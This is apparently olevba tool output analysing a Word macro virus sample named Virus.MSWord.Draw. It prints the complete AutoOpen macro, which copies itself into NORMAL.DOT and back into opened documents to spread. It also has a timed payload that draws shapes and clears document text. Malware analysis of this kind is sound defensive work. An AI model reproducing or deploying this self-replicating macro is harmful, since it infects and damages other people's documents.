olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Draw
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument 
in file: Virus.MSWord.Draw - OLE stream: 'ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO NewMacros 
in file: Virus.MSWord.Draw - OLE stream: 'NewMacros'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Autoopen 
in file: Virus.MSWord.Draw - OLE stream: 'Autoopen'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Dim a$

 
 
On Error GoTo -1: On Error GoTo NormalDot

 


 
a$ = WordBasic.[DefaultDir$](15) + "\NORMAL.DOT"

 
WordBasic.Organizer Copy:=1, Source:=WordBasic.[FileName$](), Destination:=a$, Name:="Autoopen", Tab:=3
GoTo Fin

NormalDot:
 
 
WordBasic.FileSaveAs Name:=WordBasic.[FileName$](), Format:=1, LockAnnot:=0, Password:="", AddToMru:=1, WritePassword:="", RecommendReadOnly:=0, EmbedFonts:=0, NativePictureFormat:=0, FormsData:=0

 

a$ = WordBasic.[DefaultDir$](15) + "\NORMAL.DOT"
WordBasic.Organizer Copy:=1, Source:=a$, Destination:=WordBasic.[FileName$](), Name:="Autoopen", Tab:=3

 
WordBasic.FileSave
 

GoTo Fin


Fin:

WordBasic.ChDefaultDir WordBasic.[DefaultDir$](0), 2

 

 
If WordBasic.Second(WordBasic.Now()) > 50 Then GoTo acction Else GoTo fin2
acction:

WordBasic.DrawEllipse
WordBasic.DrawNudgeRight
WordBasic.DrawNudgeRight
WordBasic.DrawNudgeDown
WordBasic.DrawNudgeRight
WordBasic.DrawNudgeDown
WordBasic.DrawNudgeLeft
WordBasic.DrawNudgeRight
WordBasic.DrawNudgeUp
WordBasic.DrawNudgeLeft
WordBasic.DrawNudgeLeft
WordBasic.DrawNudgeUp
WordBasic.DrawNudgeRight
WordBasic.DrawNudgeDown
WordBasic.DrawNudgeLeft
WordBasic.DrawNudgeRight
WordBasic.DrawNudgeDown
WordBasic.DrawNudgeLeft
WordBasic.DrawNudgeRight
WordBasic.DrawNudgeUp
WordBasic.DrawNudgeRight
WordBasic.DrawNudgeDown
WordBasic.DrawNudgeLeft
WordBasic.DrawNudgeRight
WordBasic.DrawNudgeUp
WordBasic.DrawNudgeLeft
WordBasic.DrawNudgeRight
WordBasic.DrawNudgeUp
WordBasic.DrawNudgeLeft
WordBasic.DrawNudgeRight
WordBasic.DrawNudgeUp
WordBasic.DrawNudgeLeft
WordBasic.DrawNudgeRight
WordBasic.DrawNudgeLeft
WordBasic.DrawNudgeRight
WordBasic.DrawNudgeLeft
WordBasic.DrawNudgeRight
WordBasic.DrawNudgeLeft
WordBasic.DrawNudgeLeft
WordBasic.DrawNudgeDown
WordBasic.DrawNudgeLeft
WordBasic.DrawNudgeDown
WordBasic.DrawNudgeLeft
WordBasic.DrawNudgeUp
WordBasic.DrawNudgeUp
WordBasic.DrawNudgeLeft
WordBasic.DrawNudgeUp
WordBasic.DrawNudgeLeft
WordBasic.DrawNudgeUp
WordBasic.DrawNudgeLeft
WordBasic.DrawNudgeLeft
WordBasic.DrawNudgeLeft
WordBasic.DrawNudgeUp
WordBasic.DrawNudgeLeft
WordBasic.DrawNudgeUp
WordBasic.DrawNudgeLeft
WordBasic.DrawNudgeLeftPixel
WordBasic.DrawNudgeUpPixel
WordBasic.DrawNudgeLeftPixel
WordBasic.DrawNudgeUpPixel
WordBasic.DrawNudgeLeftPixel
WordBasic.DrawNudgeUpPixel
WordBasic.DrawNudgeLeftPixel
WordBasic.DrawNudgeUpPixel
WordBasic.DrawNudgeLeftPixel
WordBasic.DrawNudgeUpPixel
WordBasic.DrawNudgeLeftPixel
WordBasic.DrawNudgeUpPixel
WordBasic.DrawNudgeLeftPixel
WordBasic.DrawNudgeUpPixel
WordBasic.DrawNudgeLeftPixel
WordBasic.DrawNudgeUpPixel
WordBasic.DrawNudgeLeftPixel
WordBasic.DrawNudgeUpPixel
WordBasic.DrawNudgeLeftPixel
WordBasic.DrawNudgeUpPixel
WordBasic.DrawNudgeLeftPixel
WordBasic.DrawNudgeLeftPixel
WordBasic.DrawNudgeLeftPixel
WordBasic.DrawNudgeLeftPixel
WordBasic.DrawNudgeLeftPixel
WordBasic.DrawNudgeDownPixel
WordBasic.DrawNudgeLeftPixel
WordBasic.DrawNudgeDownPixel
WordBasic.DrawNudgeLeftPixel
WordBasic.DrawNudgeDownPixel
WordBasic.DrawNudgeLeftPixel
WordBasic.DrawNudgeLeft
WordBasic.DrawNudgeLeft
WordBasic.WW6_EditClear


fin2:

 
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Autoopen            |Runs when the Word document is opened        |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

